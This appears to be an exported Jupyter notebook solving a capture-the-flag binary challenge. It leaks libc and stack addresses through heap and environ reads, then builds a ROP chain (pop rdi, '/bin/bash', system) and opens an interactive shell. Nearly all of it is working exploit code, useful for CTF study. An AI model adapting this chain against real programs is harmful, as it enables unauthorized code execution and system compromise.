#!/usr/bin/env python
# coding: utf-8

# In[1]:


cur = c1
while cur.addr != 0:
  print(cur.addr, pwn.mem.read_nu64(cur.addr -16, 10))
  if input().find('1') == -1: break
  #cur.addr+=(cur.size&~1)
  cur = cur.prev_free
  print()


# In[2]:


print(hex(arena_addr))


# In[2]:


import chdrft.emu.bin_analysis as bin_analysis
import chdrft.utils.misc as cmisc

import imp
from chdrft.emu.elf import ElfUtils
import chdrft.emu.elf as celf

celf = imp.reload(celf)
binary = './chall'
elf = celf.ElfUtils(binary)

libc = celf.ElfUtils('/lib/libc.so.6')


# In[3]:


libc.offset = arena_addr - libc.get_symbol('main_arena')


# In[4]:


environ_stack = pwn.mem.read_ptr(libc.get_symbol('environ'))
print(pwn.mem.xxd(environ_stack-0x30, 0x100))

def find_stack_top_from_environ(pwn, environ_stack_addr):
  import itertools
  cur = environ_stack_addr - 8 -8
  for argc in itertools.count():
    if pwn.mem.read_ptr(cur) == argc:
      break
    cur -= 8
  return cur
    
first_call_rsp = find_stack_top_from_environ(pwn, environ_stack) - 2*8 # two pushes before first call
chall_first_ret = pwn.mem.read_ptr(first_call_rsp - 8)

elf.offset = chall_first_ret - (elf.get_symbol('_start') + 0x2a)


# In[5]:


assert elf.get_range(elf.get_entry_address(), n=0x20) == pwn.mem.read(elf.get_entry_address(), 0x20)


# In[6]:


data = bin_analysis.r2_extract_all(binary, elf.offset)
bh = bin_analysis.BinHelper(binary, data)


# In[8]:


menu_ret = cmisc.get_uniq(data.f['sym.menu'].codexrefs_funcs['main']).addr  + 5
rsp_target = first_call_rsp - 8

import itertools
for i in itertools.count():
  rsp_target -= 8
  if pwn.mem.read_ptr(rsp_target) == menu_ret:
    break
ret_addr = rsp_target


# In[9]:


from chdrft.emu.base import Stack
stack = Stack(None, pwn.mem, pwn.mem.arch, fixed_sp = ret_addr)


# In[11]:


system_addr = libc.get_dyn_symbol('system')
sx = b'/bin/bash\x00'
set_sp_gadget = 0x00000000000019cd
rdi_gadget= 0x19d3 + elf.offset
buf_addr = stack.sp + 0x40
print('SYSTEMLIBC >> ', hex(system_addr))
print('SP >> ', hex(stack.sp))


# In[12]:


stack.set(0, rdi_gadget)
stack.set(1, buf_addr)
stack.set(2, system_addr)

pwn.mem.write(buf_addr, sx)


# In[13]:


c.quit()


# In[14]:


c.conn.interactive()

